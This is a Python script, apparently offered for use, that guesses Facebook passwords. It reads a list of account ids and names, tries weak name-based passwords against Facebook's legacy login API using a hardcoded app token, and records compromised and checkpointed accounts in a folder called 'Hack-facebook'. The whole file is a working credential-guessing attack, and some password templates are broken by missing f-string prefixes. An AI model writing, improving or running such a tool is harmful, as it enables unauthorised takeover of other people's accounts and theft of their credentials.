
import os
import requests

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

RESULT_DIR = "/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/List&CP-OK/OK"
RESULT_FILE = os.path.join(RESULT_DIR, "results.txt")

ok_count = 0
cp_count = 0
counter = 0


def generate_passwords(full_name):
    first_name = full_name.split()[0].lower()
    return [f"{first_name}123", f"{first_name}1234","{first_name}12", f"{first_name}12345","{first_name}123456", f"{first_name}1234567","{first_name}123456789", f"{first_name}123123", full_name]


def process_account(line, total_accounts):
    global ok_count, cp_count, counter
    id_, name = line.strip().split("|")
    passwords = generate_passwords(name)

    for password in passwords:
        data = {
            "email": id_,
            "password": password,
        }
        headers = {
            "User-Agent": USER_AGENT,
            "Authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
        }
        response = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers)

        if response.status_code == 200:
            if "session_key" in response.text:
                save_result("OK", id_, password)
                ok_count += 1
                break
            elif "account is temporarily unavailable" in response.text:
                save_result("CP", id_, password)
                cp_count += 1
                break
        else:
            print(f"Failed to connect to Facebook API for {id_}.")

        counter += 1
        progress = (counter / total_accounts) * 100
        print(f"Progress: {counter}/{total_accounts} | OK: {ok_count} | CP: {cp_count} | Progress: {progress:.2f}%")


def save_result(status, id_, password):
    os.makedirs(RESULT_DIR, exist_ok=True)
    with open(RESULT_FILE, "a") as file:
        file.write(f"[{status}] {id_} | {password}\n")
    print(f"[{status}] {id_} | {password}")


def main():
    email_list_file = input("Enter the file with email and names: ").strip()
    if not os.path.exists(email_list_file):
        print("Error: File not found.")
        return

    with open(email_list_file, "r") as file:
        lines = file.readlines()

    total_accounts = len(lines)
    print(f"Loaded {total_accounts} accounts.")
    print("Processing accounts...")

    for line in lines:
        process_account(line, total_accounts)

    print(f"Finished. Total OK: {ok_count}, Total CP: {cp_count}")


if __name__ == "__main__":
    main()
    
    
    #@@###
